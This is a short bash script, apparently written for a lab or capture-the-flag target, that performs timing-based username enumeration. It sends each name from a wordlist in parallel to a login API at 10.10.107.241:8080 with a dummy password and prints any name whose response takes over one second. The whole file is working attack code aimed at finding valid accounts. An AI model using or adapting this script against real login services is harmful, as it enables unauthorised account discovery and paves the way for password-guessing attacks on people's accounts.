#!/bin/env bash

# requires parallel to be installed: sudo apt install parallel

timingTest() {
    tosend=$(echo \{\"username\":\"$1\",\"password\":\"nonsense\"})
    local start=$(date +%s%N)  
    curl -s -d $tosend -H "Content-Type: application/json" -X POST http://10.10.107.241:8080/api/user/login > /dev/null
    local finish="$((($(date +%s%N) - $start)/1000000))"
    if [[ $finish -gt 1000 ]]; then
        echo $1
    fi
}
export -f timingTest

cat $1 | parallel timingTest